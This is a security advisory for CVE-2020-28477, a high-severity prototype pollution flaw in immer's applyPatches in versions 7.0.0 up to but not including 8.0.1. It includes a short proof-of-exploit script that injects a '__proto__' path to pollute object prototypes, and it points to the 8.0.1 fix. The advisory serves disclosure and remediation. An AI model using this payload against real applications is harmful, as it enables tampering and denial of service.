# [H] Prototype Pollution in immer

## Summary
Severity: High
Advisory: GHSA-9qmh-276g-x5pj
CVE: CVE-2020-28477
CWE: CWE-471
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2021-01-20
Source: https://github.com/advisories/GHSA-9qmh-276g-x5pj
Type: github-advisory

## Affected
- npm: `immer` — affected >=7.0.0 <8.0.1

## Details
## Overview

Affected versions of immer are vulnerable to Prototype Pollution.

## Proof of exploit

```js
const {applyPatches, enablePatches} = require("immer");
enablePatches();
let obj = {};
console.log("Before : " + obj.polluted);
applyPatches({}, [ { op: 'add', path: [ "__proto__", "polluted" ], value: "yes" } ]);
// applyPatches({}, [ { op: 'replace', path: [ "__proto__", "polluted" ], value: "yes" } ]);
console.log("After : " + obj.polluted);
```

## Remediation

Version 8.0.1 contains a [fix](https://github.com/immerjs/immer/commit/da2bd4fa0edc9335543089fe7d290d6a346c40c5) for this vulnerability, updating is recommended.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2020-28477
- https://github.com/immerjs/immer/issues/738
- https://github.com/immerjs/immer/commit/da2bd4fa0edc9335543089fe7d290d6a346c40c5
- https://github.com/immerjs/immer/blob/master/src/plugins/patches.ts%23L213
- https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1061986
- https://snyk.io/vuln/SNYK-JS-IMMER-1019369
- https://www.npmjs.com/package/immer
